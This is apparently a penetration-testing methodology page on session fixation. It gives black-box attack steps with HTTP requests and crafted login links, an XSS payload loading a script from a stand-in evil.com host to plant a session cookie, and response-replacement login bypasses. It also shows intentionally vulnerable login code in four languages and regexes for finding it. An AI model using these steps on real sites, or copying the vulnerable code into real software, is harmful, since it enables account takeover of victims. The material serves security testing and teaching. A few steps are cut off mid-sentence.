# Session Fixation

## Check List

## Methodology

### Black Box

#### Account Take Over

{% stepper %}
{% step %}
Log in to the target site and inspect the HTTP requests using Burp Suite
{% endstep %}

{% step %}
Check whether a cookie is set for us as soon as we enter the site

```http
GET / HTTP/1.1
Host: example.com
```

Response&#x20;

```http
Set-Cookie: sessionid=ABC123XYZ; path=/; HttpOnly
```
{% endstep %}

{% step %}
If the cookie was set before authentication, then complete the authentication process and check whether the same cookie is set after authentication or not

```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: sessionid=ABC123XYZ

username=victim&password=VictimPass123
```
{% endstep %}

{% step %}
If the same cookie was issued, the session fixation vulnerability would be confirmed
{% endstep %}

{% step %}
Then check if the session that is set exists in the URL parameters and in GET form

```http
GET /dashboard?sessionid=ABC123XYZ HTTP/1.1
Host: target.com
```
{% endstep %}

{% step %}
Send the session to a user as a link so that a user can authenticate using that session

```hurl
http://target.com/login?sessionid=ABC123XYZ
```
{% endstep %}

{% step %}
Then, after the victim authenticates with the attacker's session, the attacker authenticates with the same session and gains access to the victim's panel

```http
GET /dashboard HTTP/1.1
Host: target.com
Cookie: sessionid=ABC123XYZ
```
{% endstep %}
{% endstepper %}

***

#### Authentication Bypass via Captured Login Responses

{% stepper %}
{% step %}
Send a valid login request (correct email/password)
{% endstep %}

{% step %}
Capture the response using Burp Suite and copy it
{% endstep %}

{% step %}
Log out the user
{% endstep %}

{% step %}
Send a new login request with an incorrect password
{% endstep %}

{% step %}
Replace the 400 Bad Request response with the previously captured legitimate login response (including the valid session cookie)
{% endstep %}
{% endstepper %}

***

#### Improper Session Invalidation Allows Account Access After Logout

{% stepper %}
{% step %}
Login with a valid account
{% endstep %}

{% step %}
Capture the login HTTP 302 Found response using a proxy tool like Burp Suite
{% endstep %}

{% step %}
Log out from the account
{% endstep %}

{% step %}
Clear browser cookies
{% endstep %}

{% step %}
Attempt to log in as a different user
{% endstep %}

{% step %}
During login, replace the server response with the earlier captured 302 response
{% endstep %}

{% step %}
The application logs you into the original session (`victim@example.com`), not the new user
{% endstep %}
{% endstepper %}

***

#### Account Takeover

{% stepper %}
{% step %}
Visit the target site without logging in
{% endstep %}

{% step %}
Check cookies, URL parameters, hidden fields, or response headers for a session identifier (`PHPSESSID`, `JSESSIONID`, `session_id=abc123`)
{% endstep %}

{% step %}
Open two different browsers/incognito windows
{% endstep %}

{% step %}
Visit the site, Note the session ID is generated and sent before login
{% endstep %}

{% step %}
Verify the same session ID persists after refresh or navigation
{% endstep %}

{% step %}
Create a login link containing the attacker-controlled session ID like

```hurl
https://target.com/login
https://target.com/?PHPSESSID=attacker123
https://target.com/dashboard;jsessionid=attacker123
```
{% endstep %}

{% step %}
Send the malicious link via email, chat, or phishing page (victim trusts the domain)
{% endstep %}

{% step %}
Victim clicks the link → Lands on site with attacker’s session ID
{% endstep %}

{% step %}
Victim enters valid credentials and logs in successfully
{% endstep %}

{% step %}
Application does NOT issue a new session ID after successful authentication, `Same attacker123` remains active
{% endstep %}

{% step %}
Attacker visits the site using the same session ID

```hurl
https://target.com/?PHPSESSID=attacker123
```
{% endstep %}

{% step %}
Instantly logged in as the victim, Full session takeover
{% endstep %}
{% endstepper %}

***

### White Box

#### Pre-Authentication Context Upgrading (The "Guest Cart" Hijack)

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on enterprise e-commerce platforms, booking engines, or SaaS applications that allow users to interact with the platform (e.g., adding items to a cart, configuring a dashboard) _before_ logging in
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the session management lifecycle
{% endstep %}

{% step %}
Identify the "Anonymous Session" architecture. To track the user's pre-authentication state (the guest shopping cart), the backend framework generates a standard HTTP session cookie the moment the user visits the homepage (e.g., `Set-Cookie: JSESSIONID=abc123xyz`)
{% endstep %}

{% step %}
Investigate the Authentication boundary. The user navigates to the checkout page and submits their username and password via `POST /api/v1/auth/login`
{% endstep %}

{% step %}
Analyze the Session Upgrading logic. The backend controller verifies the password. To preserve the user's guest cart, the developer simply binds the newly authenticated User ID to the _existing_ active session object in memory
{% endstep %}

{% step %}
Discover the fatal cryptographic flaw: The developer fails to explicitly command the framework to invalidate the old session identifier and issue a newly cryptographically randomized session token (e.g., `session.regenerate()`)
{% endstep %}

{% step %}
Understand the vulnerability: The session identifier (`JSESSIONID=abc123xyz`) remains identical before and after the authentication event. The trust level of the token is upgraded, but the string itself is fixated
{% endstep %}

{% step %}
Formulate the Session Fixation payload. You must force a victim to authenticate using a session identifier that you already control
{% endstep %}

{% step %}
Navigate to the enterprise platform using your own browser. The server assigns you a guest session cookie (e.g., `session_id=ATTACKER_KNOWN_TOKEN`)
{% endstep %}

{% step %}
Inject this session identifier into the victim's browser. This can be achieved via a Cross-Site Scripting (XSS) vulnerability, an HTTP Response Splitting attack, or simply by sending the victim a crafted link if the application misconfigures sessions to accept URL parameters (e.g., `[https://enterprise.tld/login?session_id=ATTACKER_KNOWN_TOKEN](https://enterprise.tld/login?session_id=ATTACKER_KNOWN_TOKEN)`)
{% endstep %}

{% step %}
The victim, unaware their session has been pre-seeded, submits their credentials to log in
{% endstep %}

{% step %}
The backend authenticates the victim and upgrades the trust level of `ATTACKER_KNOWN_TOKEN`
{% endstep %}

{% step %}
The attacker refreshes their original browser (which still holds `ATTACKER_KNOWN_TOKEN`). The backend evaluates the token, sees it is now bound to an authenticated user, and grants the attacker full access to the victim's account

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(HttpContext\.Session\.SetString\()(?!.*Session\.Clear)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(session\.setAttribute\(['"]user['"])(?!.*changeSessionId)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(session\(\[[^\]]+\]\);)(?!.*session\(\)->regenerate\(\))
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(req\.session\.user\s*=\s*[a-zA-Z0-9_]+;)(?!\s*req\.session\.regenerate)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
"HttpContext\.Session\.SetString\((?!.*Session\.Clear)"
```
{% endtab %}

{% tab title="Java" %}
```regexp
"session\.setAttribute\(['\"]user['\"])(?!.*changeSessionId)"
```
{% endtab %}

{% tab title="PHP" %}
```regexp
"session\(\[[^\]]+\]\);(?!.*session\(\)->regenerate\(\))"
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
"req\.session\.user\s*=\s*[a-zA-Z0-9_]+;(?!\s*req\.session\.regenerate)"
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPost("/api/v1/auth/login")]
public async Task<IActionResult> Login([FromBody] LoginDto req)
{
    var user = await _authService.ValidateUserAsync(req.Email, req.Password);
    
    if (user != null)
    {
        // [1]
        // [2]
        // In ASP.NET Core, the ISession object does not have a native .Regenerate() method.
        // Developers must manually clear the session or re-issue the auth cookie.
        // Failing to do so binds the new identity to the pre-existing session token.
        HttpContext.Session.SetString("AuthenticatedUserId", user.Id.ToString());
        
        return Ok();
    }
    return Unauthorized();
}
```
{% endtab %}

{% tab title="Java" %}
```java
@PostMapping("/api/v1/auth/login")
public ResponseEntity<?> login(@RequestBody AuthRequest req, HttpServletRequest request) {
    User user = authService.authenticate(req.getUsername(), req.getPassword());
    
    if (user != null) {
        // [1]
        // [2]
        // Spring Security typically protects against this, but custom authentication 
        // endpoints that manipulate the HttpSession directly bypass these protections.
        HttpSession session = request.getSession(true); // Retrieves existing guest session
        
        // Missing: request.changeSessionId();
        session.setAttribute("USER_SESSION", user);
        
        return ResponseEntity.ok().build();
    }
    return ResponseEntity.status(401).build();
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class AuthController extends Controller
{
    public function login(Request $request)
    {
        $credentials = $request->only('email', 'password');

        if (Auth::validate($credentials)) {
            $user = Auth::getLastAttempted();
            
            // [1]
            // [2]
            // Standard Laravel Auth::attempt() handles fixation automatically.
            // However, developers building custom auth flows often forget it.
            session(['user_id' => $user->id]);
            
            // Missing: $request->session()->regenerate();
            
            return response()->json(['status' => 'success']);
        }

        return response()->json(['error' => 'Unauthorized'], 401);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.post('/api/v1/auth/login', async (req, res) => {
    const user = await authenticate(req.body.email, req.body.password);
    
    if (user) {
        // [1]
        // [2]
        // Fatal Flaw: The developer binds the authenticated user ID to the 
        // existing guest session without regenerating the session ID.
        // Correct logic: req.session.regenerate(() => { req.session.userId = user.id; });
        req.session.userId = user.id; 
        
        // [3]
        // [4]
        // The guest cart items stored in req.session.cart are preserved, 
        // but the session ID string remains identical, allowing Session Fixation.
        return res.json({ success: true, cart: req.session.cart });
    }
    res.status(401).send("Unauthorized");
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture supports complex pre-authentication states, assigning persistent tracking tokens to unauthenticated users to manage temporary data, \[2] The backend framework utilizes a stateful session memory store, mapping the client's cookie to an internal data object, \[3] To provide a seamless transition from "Guest" to "Authenticated," developers retain the existing session object to prevent dropping the user's pre-authentication data, \[4] The execution sink. Developers misunderstood the cryptographic lifecycle of an authentication boundary. By altering the privileges of the internal session object _without_ simultaneously destroying and re-issuing the external cryptographic pointer (the Session ID cookie), they decouple the token's origin from its destination state. The attacker exploits this by acquiring a token during the low-privilege phase and planting it in the victim's execution path. When the victim authenticates, the backend elevates the privileges of the attacker's pre-held token. The attacker, possessing the exact same token, bypasses the authentication perimeter seamlessly

```http
// 1. Attacker visits the site to obtain a valid Guest Session.
GET / HTTP/1.1
Host: shop.enterprise.tld

// Server Response:
HTTP/1.1 200 OK
Set-Cookie: session_id=ATTACKER_GUEST_TOKEN_999; Path=/; HttpOnly

// 2. Attacker forces this cookie into the victim's browser (e.g., via a sub-domain XSS).
// document.cookie = "session_id=ATTACKER_GUEST_TOKEN_999; Path=/; domain=.enterprise.tld";

// 3. The victim navigates to the login page and submits their credentials.
POST /api/v1/auth/login HTTP/1.1
Host: shop.enterprise.tld
Cookie: session_id=ATTACKER_GUEST_TOKEN_999
Content-Type: application/json

{"email": "victim@enterprise.com", "password": "SecurePassword123"}

// 4. The backend authenticates the user. It upgrades the trust level of ATTACKER_GUEST_TOKEN_999
//    inside the server's memory. IT DOES NOT ISSUE A NEW SET-COOKIE HEADER.
HTTP/1.1 200 OK
Content-Type: application/json

{"status": "Logged In"}

// 5. The attacker opens their own browser, which already contains ATTACKER_GUEST_TOKEN_999.
// 6. The attacker navigates to the /dashboard. The server accepts the token as the victim.
```
{% endstep %}

{% step %}
To ensure a frictionless user experience, architects engineered persistent session states that traversed the pre-authentication and post-authentication boundaries. This design sought to preserve temporary user data (like shopping carts) during the login transition. The systemic security failure arose from a failure to rotate the cryptographic transport artifact (the Session ID) during the privilege elevation phase. Developers assumed that verifying the user's password inherently secured the resulting session state. They overlooked the fact that an attacker could pre-determine the session identifier before the cryptographic boundary was crossed. By failing to invoke session regeneration APIs, the backend effectively endorsed a user-supplied (or attacker-supplied) identifier as a highly privileged master key, granting the attacker frictionless, unauthenticated access to the victim's account via a hijacked, pre-established state pipeline
{% endstep %}
{% endstepper %}

***

#### Cross-Subdomain Session Forgery via Broad Cookie Scoping

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on massive enterprise ecosystems comprising multiple interconnected subdomains (e.g., `app.enterprise.com`, `billing.enterprise.com`, `marketing.enterprise.com`)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the global session configuration or Single Sign-On (SSO) middleware
{% endstep %}

{% step %}
Identify the "Seamless SSO" architecture. To prevent users from having to log in separately to `app.enterprise.com` and `billing.enterprise.com`, infrastructure engineers configure the primary application to issue session cookies with a broadened scope
{% endstep %}

{% step %}
Investigate the Cookie attributes. Instead of issuing the cookie exclusively to the originating domain (`domain=app.enterprise.com`), the backend sets the domain attribute to the apex root (`domain=.enterprise.com`)
{% endstep %}

{% step %}
Analyze the intra-organizational trust boundary. Because the cookie is scoped to the root domain, the browser will append this session cookie to _any_ HTTP request destined for _any_ subdomain of `enterprise.com`
{% endstep %}

{% step %}
Discover the fatal perimeter collapse: The security team rigorously hardens the core applications (`app` and `billing`), but completely neglects low-value, peripheral subdomains (e.g., a forgotten WordPress installation at `blog.enterprise.com`, or a vulnerable marketing landing page at `promo.enterprise.com`)
{% endstep %}

{% step %}
Understand the vulnerability: If an attacker finds a simple Cross-Site Scripting (XSS) vulnerability on _any_ low-value subdomain, they can write JavaScript to forcefully inject a session cookie scoped to the root `.enterprise.com` domain. When the victim navigates to the highly secure `app.enterprise.com`, the browser transmits the attacker's injected cookie. If `app.enterprise.com` suffers from Session Fixation (failing to regenerate the ID on login), the attacker achieves account takeover on the secure platform via an exploit on the insecure platform
{% endstep %}

{% step %}
Formulate the Cross-Subdomain Fixation payload. You must exploit an XSS on a peripheral subdomain to fixate the session on the core subdomain
{% endstep %}

{% step %}
Discover an XSS on `[https://blog.enterprise.com/search?q=XSS](https://blog.enterprise.com/search?q=XSS)`
{% endstep %}

{% step %}
Construct the payload to generate a known session ID and bind it to the root domain: `document.cookie = "SESSION_ID=HACKED_TOKEN_123; domain=.enterprise.com; path=/; Secure; HttpOnly";`
{% endstep %}

{% step %}
Trick the victim into clicking the XSS link on `blog.enterprise.com`. The malicious cookie is silently written to their browser
{% endstep %}

{% step %}
The victim naturally navigates to `[https://app.enterprise.com/login](https://app.enterprise.com/login)` and enters their credentials
{% endstep %}

{% step %}
The victim's browser submits the credentials alongside the injected `Cookie: SESSION_ID=HACKED_TOKEN_123`&#x20;
{% endstep %}

{% step %}
The core application authenticates the victim and fixates the session to `HACKED_TOKEN_123`. The attacker bypasses all defenses on the core application by leveraging a structural cookie-scoping vulnerability from a forgotten subdomain

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(Cookie\.Domain\s*=\s*['"]\.)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(cookie\.setDomain\(['"]\.)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
('domain'\s*=>\s*env\('SESSION_DOMAIN',\s*['"]\.)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(domain\s*:\s*['"]\.?[a-zA-Z0-9-]+\.[a-zA-Z]{2,}['"])
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
"Cookie\.Domain\s*=\s*['\"]\."
```
{% endtab %}

{% tab title="Java" %}
```regexp
"cookie\.setDomain\(['\"]\."
```
{% endtab %}

{% tab title="PHP" %}
```regexp
"'domain'\s*=>\s*env\('SESSION_DOMAIN',\s*['\"]\."
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
"domain\s*:\s*['\"]\.?[a-zA-Z0-9-]+\.[a-zA-Z]{2,}['\"]"
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddSession(options =>
    {
        options.Cookie.Name = "SESSION_ID";
        options.Cookie.HttpOnly = true;
        options.Cookie.IsEssential = true;
        // [1]
        // [2]
        // Broad scoping expands the attack surface to the weakest link in the organization.
        // [3]
        // [4]
        options.Cookie.Domain = ".enterprise.tld";
    });
}
```
{% endtab %}

{% tab title="Java" %}
```java
# [1]
# [2]
# Centralized session configuration for Spring Boot
server.servlet.session.cookie.name=SESSION_ID
server.servlet.session.cookie.http-only=true
server.servlet.session.cookie.secure=true

# [3]
# [4]
# Allows cross-subdomain access, implicitly trusting all subdomains
server.servlet.session.cookie.domain=.enterprise.tld
```
{% endtab %}

{% tab title="PHP" %}
```php
return [
    'driver' => env('SESSION_DRIVER', 'file'),
    'lifetime' => env('SESSION_LIFETIME', 120),
    'expire_on_close' => false,
    
    // [1]
    // [2]
    // [3]
    // [4]
    // The wildcard dot prefix allows the cookie to traverse the entire enterprise ecosystem.
    'domain' => env('SESSION_DOMAIN', '.enterprise.tld'),
    'secure' => env('SESSION_SECURE_COOKIE', true),
    'http_only' => true,
];
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const session = require('express-session');

// [1]
// [2]
// To share sessions between app.tld and billing.tld, the developer 
// configures the cookie domain to encompass the entire root domain.
app.use(session({
    secret: 'enterprise-super-secret',
    name: 'SESSION_ID',
    resave: false,
    saveUninitialized: true,
    cookie: { 
        secure: true,
        httpOnly: true,
        // [3]
        // [4]
        // Fatal Misconfiguration: Any compromised subdomain (e.g., an abandoned blog)
        // can overwrite or pre-seed this cookie in the victim's browser.
        domain: '.enterprise.tld' 
    }
}));
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture mandates a unified Single Sign-On (SSO) experience across disparate organizational subdomains, \[2] To orchestrate this, infrastructure engineers loosen the browser's native Same-Origin Policy (SOP) restrictions by appending a wildcard prefix (`.`) to the session cookie's `domain` attribute, \[3] The architecture assumes that all subdomains operating under the apex domain possess a uniform, equivalent security posture, \[4] The execution sink. By modifying the cookie's domain scope, developers established a transitive trust relationship across the entire DNS hierarchy. The enterprise's security perimeter is instantly downgraded to the operational baseline of its most vulnerable peripheral asset. The attacker locates a peripheral vulnerability (e.g., XSS on an unmaintained marketing site) and leverages the native browser specification to force-feed a malicious session identifier into the global `.enterprise.tld` cookie jar. When the victim accesses the heavily fortified core application, the browser faithfully delivers the attacker's fixated token, allowing the attacker to subvert the core platform's authentication matrix from the organizational periphery

```http
// 1. Attacker finds an XSS vulnerability on a forgotten subdomain: https://blog.enterprise.tld

// 2. Attacker crafts a payload to fixate the session cookie for the secure core application.
// The payload is injected into the blog: https://blog.enterprise.tld/search?q=<script src="https://evil.com/fixate.js"></script>

// --- Inside fixate.js ---
// 3. The attacker sets a known session ID. By specifying domain=.enterprise.tld, 
//    the browser will send this cookie to app.enterprise.tld.
document.cookie = "SESSION_ID=ATTACKER_FORGED_SESSION_9918; domain=.enterprise.tld; path=/; Secure; HttpOnly";
// ------------------------

// 4. The attacker emails the blog link to the victim.
// 5. The victim clicks the link. The cookie is silently seeded.
// 6. The victim navigates to https://app.enterprise.tld/login and logs in.

// 7. The victim's browser sends the forged cookie during the login POST request:
POST /login HTTP/1.1
Host: app.enterprise.tld
Cookie: SESSION_ID=ATTACKER_FORGED_SESSION_9918
Content-Type: application/x-www-form-urlencoded

username=admin&password=Password1

// 8. The backend (vulnerable to Session Fixation) authenticates the user and binds their 
//    identity to ATTACKER_FORGED_SESSION_9918.
// 9. The attacker navigates to app.enterprise.tld using the same token and compromises the account.
```
{% endstep %}

{% step %}
To deliver seamless authentication across sprawling corporate ecosystems, architects broadened the scope of cryptographic session cookies to encompass the entire apex domain. This optimization relied on the assumption of uniform organizational security, effectively merging the threat models of all distinct subdomains into a single, shared attack surface. The security posture failed because peripheral, low-value assets (like marketing blogs) inevitably lack the rigorous hardening applied to core financial or administrative platforms. The attacker capitalized on this imbalance. By exploiting an elementary injection flaw on a forgotten subdomain, the attacker manipulated the browser's cookie-scoping rules to project a fixated session identifier across the DNS boundary. The core application, implicitly trusting the pre-seeded token arriving from the client, mapped the victim's authenticated identity to the attacker's artifact. This architectural maneuver allowed the attacker to execute a catastrophic core-system Account Takeover without directly interacting with the core system's perimeter defenses
{% endstep %}
{% endstepper %}

***

#### Client-Dictated Device ID Upgrading in Stateless API Gateways

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on modern, mobile-first architectures or Stateless API Gateways (e.g., GraphQL federations, REST microservices) that rely on custom HTTP headers rather than traditional cookies for session tracking
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the API's authentication flow and device-tracking middleware
{% endstep %}

{% step %}
Identify the "Stateless Device Tracking" architecture. To provide a personalized experience for users who download a mobile app but haven't created an account yet, the mobile app generates a unique identifier (e.g., a UUID) and transmits it via a custom header on every request: `X-Device-ID: 550e8400-e29b-41d4-a716-446655440000`
{% endstep %}

{% step %}
Investigate the Backend Caching logic. The API Gateway uses this `X-Device-ID` as a key in a high-speed Redis cluster to store temporary guest settings (e.g., `Redis.set("device:550e8400...", "{guest_prefs}")`)
{% endstep %}

{% step %}
Analyze the Authentication endpoint. The user creates an account or logs in via `POST /api/v1/auth/login`. The mobile app transmits the credentials _alongside_ the existing `X-Device-ID` header
{% endstep %}

{% step %}
Discover the fatal API Fixation vulnerability: In a misguided attempt to keep the architecture "stateless" and avoid managing traditional rotating JWTs, the developer simply updates the Redis cache record associated with the `X-Device-ID`. They bind the authenticated `user_id` directly to the client-provided device string (e.g., `Redis.set("device:550e8400...", "{user_id: 99}")`)
{% endstep %}

{% step %}
Understand the vulnerability: The backend has completely surrendered cryptographic entropy generation to the untrusted client environment. Because the backend accepts and upgrades an arbitrary, client-provided string to an authenticated state, it commits the ultimate form of Session Fixation
{% endstep %}

{% step %}
Formulate the Header-Based Fixation payload. You must extract a valid (or generate an arbitrary) Device ID, seed it to a victim, and wait for them to&#x20;
{% endstep %}

{% step %}
Generate an arbitrary UUID: `ATTACKER-UUID-`
{% endstep %}

{% step %}
Coerce the victim into utilizing your Device ID. In mobile architectures, this is often achieved via Deep Linking (e.g., sending an SMS link like `myapp://login?device_id=ATTACKER-UUID-1234` which forces the app to adopt the ID) or via a Man-in-the-Middle (MitM) proxy if pinning is misconfigured
{% endstep %}

{% step %}
The victim opens the app. The app transmits `X-Device-ID: ATTACKER-UUID-1234`
{% endstep %}

{% step %}
The victim logs in. The backend validates the password and maps the victim's internal account ID to `ATTACKER-UUID-1234` in Redis
{% endstep %}

{% step %}
You execute raw `cURL` commands against the API, attaching the custom header: `X-Device-ID: ATTACKER-UUID-1234`. The API Gateway queries Redis, verifies the mapping, and grants you full authenticated API access

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(_cache\.SetString\(Request\.Headers\["X-Device-ID"\])
```
{% endtab %}

{% tab title="Java" %}
```regexp
(redisTemplate\.opsForValue\(\)\.set\(request\.getHeader\("X-Device-ID"\))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(Cache::put\(\$request->header\('X-Device-ID'\))
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(redis\.set\(\s*req\.headers\['x-device-id'\])
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
"_cache\.SetString\(Request\.Headers\[\"X-Device-ID\"\]"
```
{% endtab %}

{% tab title="Java" %}
```regexp
"redisTemplate\.opsForValue\(\)\.set\(request\.getHeader\(\"X-Device-ID\"\)"
```
{% endtab %}

{% tab title="PHP" %}
```regexp
"Cache::put\(\\$request->header\('X-Device-ID'\)"
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
"redis\.set\(\s*req\.headers\['x-device-id'\]"
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPost("/api/v1/auth/login")]
public async Task<IActionResult> Login([FromBody] LoginRequest req)
{
    // [1]
    // [2]
    var deviceId = Request.Headers["X-Device-ID"].FirstOrDefault();
    var user = await _userService.AuthenticateAsync(req.Username, req.Password);

    if (user != null && !string.IsNullOrEmpty(deviceId))
    {
        // [3]
        // [4]
        // Caching the user's ID against the attacker-controllable header value
        var options = new DistributedCacheEntryOptions { AbsoluteExpirationRelativeToNow = TimeSpan.FromDays(7) };
        await _cache.SetStringAsync($"session_{deviceId}", user.Id.ToString(), options);

        return Ok(new { Message = "Authenticated" });
    }
    return Unauthorized();
}
```
{% endtab %}

{% tab title="Java" %}
```java
@PostMapping("/api/v1/auth/login")
public ResponseEntity<?> login(@RequestBody LoginDto req, HttpServletRequest request) {
    // [1]
    // [2]
    String deviceId = request.getHeader("X-Device-ID");
    
    User user = authService.verifyCredentials(req.getEmail(), req.getPassword());
    
    if (user != null && deviceId != null) {
        // [3]
        // [4]
        // Upgrades the client-provided header to an authenticated session token
        redisTemplate.opsForValue().set("device_session:" + deviceId, user.getId());
        
        return ResponseEntity.ok().build();
    }
    return ResponseEntity.status(401).build();
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class AuthController extends Controller
{
    public function login(Request $request)
    {
        // [1]
        // [2]
        $deviceId = $request->header('X-Device-ID');
        
        if (Auth::attempt($request->only('email', 'password')) && $deviceId) {
            
            $user = Auth::user();
            
            // [3]
            // [4]
            // Laravel's Cache is weaponized as a custom, vulnerable session store
            Cache::put("device_{$deviceId}", $user->id, now()->addDays(7));
            
            return response()->json(['status' => 'success']);
        }
        
        return response()->json(['error' => 'Unauthorized'], 401);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.post('/api/v1/auth/login', async (req, res) => {
    const { email, password } = req.body;
    
    // [1]
    // [2]
    // The backend extracts the session identifier directly from an untrusted client header
    const deviceId = req.headers['x-device-id'];
    
    if (!deviceId) return res.status(400).send("Device ID required");

    const user = await authenticate(email, password);
    if (user) {
        // [3]
        // [4]
        // Fatal Flaw: The backend delegates entropy generation to the client.
        // It binds the highly sensitive authentication context directly to the 
        // client-provided string. There is no cryptographic rotation.
        await redis.set(`auth:${deviceId}`, JSON.stringify({ userId: user.id }));
        
        return res.json({ success: true }); // No new JWT/Token is issued!
    }
    
    res.status(401).send("Unauthorized");
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture abandons traditional browser cookies in favor of stateless, header-based routing to support diverse clients (mobile apps, IoT devices, desktop clients), \[2] To track anonymous user journeys prior to account creation, the API Gateway consumes custom HTTP headers (e.g., `X-Device-ID`) dynamically generated by the client application, \[3] The architecture utilizes high-performance, in-memory caches (Redis/Memcached) to bind these transient device headers to physical user identities upon authentication, \[4] The execution sink. The API fundamentally violates the core tenet of session cryptography: the server must unilaterally generate and dictate the authentication token. By allowing the client to provide the identifier, the backend reduces the authentication flow to a mere state-toggling operation on a pre-existing string. The attacker bypasses session entropy entirely by generating their own identifier. Through application deep-linking or social engineering, the attacker forces the victim's device to transmit this poisoned identifier during the login sequence. The backend blindly upgrades the trust tier of the attacker's custom string. The attacker directly queries the API using their pre-crafted header, achieving total architectural subversion via Stateless Session Fixation

```http
// 1. Attacker generates a random UUID: 99999999-AAAA-BBBB-CCCC-111111111111
// 2. Attacker sends an SMS to the victim containing a deep link:
//    enterpriseapp://promo?apply_device_tracking_id=99999999-AAAA-BBBB-CCCC-111111111111

// 3. Victim clicks the link. The mobile app launches, overriding its internal Device ID storage.
// 4. Victim navigates to the login screen and authenticates.

POST /api/v1/auth/login HTTP/1.1
Host: api.enterprise.tld
X-Device-ID: 99999999-AAAA-BBBB-CCCC-111111111111
Content-Type: application/json

{"email": "ceo@enterprise.tld", "password": "SuperSecretPassword"}

// 5. The backend validates the password.
// 6. The backend updates Redis: SET "auth:99999999-AAAA-BBBB-CCCC-111111111111" -> "CEO_ID_001"
// 7. The backend returns 200 OK without issuing a newly randomized JWT.

// 8. The attacker opens their terminal and executes an administrative API call, 
//    injecting the header they generated in Step 1.
GET /api/v1/admin/financials HTTP/1.1
Host: api.enterprise.tld
X-Device-ID: 99999999-AAAA-BBBB-CCCC-111111111111

// 9. The backend Gateway checks Redis. It finds the CEO's ID linked to the header.
// 10. The backend returns the highly classified financial data.
```
{% endstep %}

{% step %}
To support heterogeneous client ecosystems, API architects dismantled traditional cookie-based session management, replacing it with a custom, header-driven identity resolution matrix utilizing high-speed caching layers. This architectural pivot transferred the responsibility of identifier generation from the secure backend cryptographic engine to the untrusted client-side execution environment. The security vulnerability materialized as a total inversion of cryptographic authority. Backend developers assumed that successfully verifying a password mathematically sanitized the accompanying client headers. Consequently, they executed a state upgrade against an untrusted, client-dictated string instead of issuing a fresh, server-generated cryptographic token. The attacker exploited this inversion by seeding a predictable string into the victim's client environment prior to authentication. When the backend upgraded the trust level of this string, the attacker possessed a pre-authorized master key, bypassing the enterprise's entire authentication and token-management perimeter
{% endstep %}
{% endstepper %}

***



## Cheat Sheet
